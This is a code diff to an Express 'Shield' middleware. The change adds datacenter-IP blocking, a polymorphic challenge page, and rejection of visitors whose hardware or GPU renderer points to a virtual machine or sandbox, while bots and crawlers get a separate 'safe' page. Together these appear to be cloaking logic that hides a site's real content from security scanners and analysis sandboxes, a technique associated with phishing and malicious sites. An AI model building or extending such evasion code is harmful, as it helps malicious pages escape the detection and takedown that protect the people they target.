@@ -1,11 +1,12 @@
 import { Request, Response, NextFunction } from 'express';
 import path from 'path';
 import geoip from 'geoip-lite';
+import { isCloudIp } from './ip-ranges';
+import { generateChallengePage } from './polymorph';
 
 // Adjust path based on execution context (dist-server vs server)
 // In Docker/Prod, views are in ./views relative to this file (if compiled to dist-server/shield.js)
 const SAFE_PAGE = path.join(__dirname, 'views', 'safe.html');
-const CHALLENGE_PAGE = path.join(__dirname, 'views', 'challenge.html');
 
 // List of known bot User-Agent fragments
 const BOT_AGENTS = [
@@ -17,6 +18,16 @@ const BOT_AGENTS = [
     'nuzzel', 'discordbot', 'google page speed', 'qwantify',
     'bot', 'spider', 'crawl', 'scraper',
     'headlesschrome', 'phantomjs', 'selenium', 'webdriver', 'playwright'
+];
+
+const SUSPICIOUS_RENDERERS = [
+    'swiftshader',
+    'llvmpipe',
+    'vmware',
+    'virtualbox',
+    'software rasterizer',
+    'microsoft basic render',
+    'mesa'
 ];
 
 export const checkBot = (req: Request): boolean => {
@@ -34,6 +45,12 @@ export const checkBot = (req: Request): boolean => {
     // Allow local/private IPs
     if (ip === '::1' || ip === '127.0.0.1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('::ffff:127.0.0.1')) {
         return false;
+    }
+
+    // 3. Cloud/Datacenter Check
+    if (isCloudIp(ip)) {
+        // console.log(`[Shield] Blocked Cloud IP: ${ip}`);
+        return true;
     }
 
     const geo = geoip.lookup(ip);
@@ -70,13 +87,33 @@ export const shieldMiddleware = (req: Request, res: Response, next: NextFunction
     }
 
     // 4. Serve Challenge
-    res.status(200).sendFile(CHALLENGE_PAGE);
+    res.status(200).send(generateChallengePage());
 };
 
 export const verifyHandler = (req: Request, res: Response) => {
     // Double check Bot
     if (checkBot(req)) {
          return res.status(403).json({ status: 'blocked' });
+    }
+
+    const body = req.body;
+
+    // 1. Hardware Check
+    if (body.hardware) {
+        const concurrency = body.hardware.concurrency;
+        if (concurrency && concurrency < 2) {
+            console.log(`[Shield] Blocked Low Concurrency: ${concurrency}`);
+            return res.status(403).json({ status: 'blocked', reason: 'hardware' });
+        }
+    }
+
+    // 2. Graphics Check
+    if (body.graphics) {
+        const renderer = (body.graphics.renderer || '').toLowerCase();
+        if (SUSPICIOUS_RENDERERS.some(r => renderer.includes(r))) {
+            console.log(`[Shield] Blocked Suspicious Renderer: ${renderer}`);
+            return res.status(403).json({ status: 'blocked', reason: 'graphics' });
+        }
     }
 
     // Set Cookie
